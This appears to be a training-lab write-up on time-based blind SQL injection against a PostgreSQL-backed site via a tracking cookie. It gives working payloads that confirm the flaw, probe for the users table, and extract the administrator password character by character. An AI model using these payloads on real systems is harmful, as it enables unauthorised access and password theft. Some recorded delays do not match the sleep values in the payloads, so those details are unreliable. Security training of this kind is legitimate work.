Lab #13 - Blind SQL injection attack using time delays

Vulnerable parameter - Tracking Cookie

End Goals:

- Exploit time based Blind SQLi to output administrator password
- Login as administrator user

Analysis:

1. Confirm the parameter is vulnerable

   g31CW6mjktuq8Zkd' || pg_sleep(10)-- -> `10 sec delay` -> `postgresql database`

2. Confirm that the users table exists in database

   g31CW6mjktuq8Zkd' || (select case when(username='administrator') then pg_sleep(5) else pg_sleep(-1) end from users)-- -> `5 sec delay` -> `users table and user administrator exists`

3. Determine the length of password for the 'administrator'

   g31CW6mjktuq8Zkd' || (select case when(username='administrator' and LENGTH(password)>=1) then pg_sleep(3) else pg_sleep(-1) end from users)-- -> `5 sec delay` -> `password greater than 1 char` -> `password = 20 characters`

4. Determine the password for the 'administrator'

   g31CW6mjktuq8Zkd' || (select case when(username='administrator' and substring(password,1,1)='a') then pg_sleep(3) else pg_sleep(-1) end from users)-- `gives 5 sec delay if`**1st**`char is`**a**
